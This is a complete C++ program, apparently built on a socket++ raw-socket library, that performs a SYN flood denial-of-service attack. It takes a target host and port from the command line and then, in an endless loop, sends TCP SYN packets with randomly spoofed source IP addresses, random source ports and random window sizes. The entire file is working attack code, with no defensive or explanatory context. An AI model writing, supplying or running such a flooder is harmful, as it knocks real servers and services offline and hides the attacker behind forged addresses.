#include <socket++.h>
#include <sstream>
#include <cstdlib>
using namespace std;
using namespace socketpp;

void synflood(in_addr_t addr, port_t port)
{
    srandom(time(NULL));

    TCP_IP_RawSocket sd;

    while(1) {
        sd.build_IP_header(random(), addr);
        sd.build_TCP_header(random()%65535+1, port, 1, 0, 1024*(random()%4+1), 0, 1);
        sd.adjust_TCP_IP_all();

        sd.send_packet(addr);
    }
    sd.close();
}

int main(int argc, char **argv)
{
    AddrHandler h;
    in_addr_t addr;
    port_t port;

    if(argc < 3) {
        cerr << argv[0] <<" <address> <port>" <<endl;
        return -1;
    }
    istringstream ss (argv[2]);
    ss >>port;
    if(ss.fail()) {
        cerr <<"`" <<argv[2]<<"` not a valid port number" <<endl;
        return -1;
    }
    if(h.isIPv4(argv[1])) {
        addr = h.inet_aton(argv[1]);
    } else {
        addr = h.inet_aton(h.gethostbyname(argv[1])[0]);
    }

    synflood(addr, port);

    return 0;
}
